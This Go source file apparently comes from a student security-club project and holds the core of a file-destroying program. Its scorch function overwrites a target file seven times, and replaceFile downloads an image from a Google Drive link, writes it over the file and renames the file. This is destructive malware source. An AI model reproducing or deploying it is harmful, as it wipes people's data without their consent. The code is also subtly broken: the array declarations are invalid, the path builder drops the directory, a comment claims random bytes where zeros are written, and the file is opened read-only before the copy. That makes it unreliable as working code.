package ritsecMentorProject

import (
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strings"
)

// List of image links, in order of name type, this will aid with renaming files
var PICLINKS ["https://drive.google.com/a/g.rit.edu/file/d/1HUMdT8YL_nhmBniqahZe7m5Ep2OAK-Rd/view?usp=sharing"]string

// List of new file names, correspond to image link
var PICNAMES ["jack_jack"]string

// Create New File Location
// @return: potential new directory filename string
func newPath(old string, new string) string {
	lastSlash := -1
	for i, symbol := range old {
		if string(symbol) == "\\" || string(symbol) == "/" {
			lastSlash = i
		}
	}
	// Slices the string
	newPath := make([]string, lastSlash)
	// Join the []string into a string
	newPathString := strings.Join(newPath, "")
	// Concat the new file name to the directory
	newPathString += new
	return newPathString
}

// Change the name of a fully replaced file
func renameFile(old string, new string) {
	// Old Path
	oldLocation := old
	// New Image
	newLocation := new
	// Replace file
	path := newPath(oldLocation, newLocation)
	// Rename File
	err := os.Rename(oldLocation, path)
	if err != nil {
		return
	} // if failed return
}

// Make a web request to get the image
func getImage(url string) *http.Response {
	image, e := http.Get(url) // get image from remote repository
	if e != nil {
		return nil
	} // if failed, return nil
	return image
}

// Scorch the original file
func scorch(path string) {
	info, err := os.Stat(path) // get length of file
	if err != nil {
		return
	} // if not open, just return

	fileSize := info.Size() // get the length of the original file

	for i := 0; i < 7; i++ { // scorch the file 7 times
		replacement := make([]byte, fileSize)
		_ = ioutil.WriteFile(path, replacement, 644) // overwrite file with random bytes
	}
}

// Replace the old file with the new image
func replaceFile(file string, pics []*http.Response) {
	scorch(file)                          // thoroughly overwrite file
	replaceNumber := rand.Intn(len(pics)) // decide which image to replace file with
	f, err := os.Open(file)
	if err != nil {
		return
	}
	_, _ = io.Copy(f, pics[replaceNumber].Body) // write image on old file location
	renameFile(file, PICNAMES[replaceNumber])
}
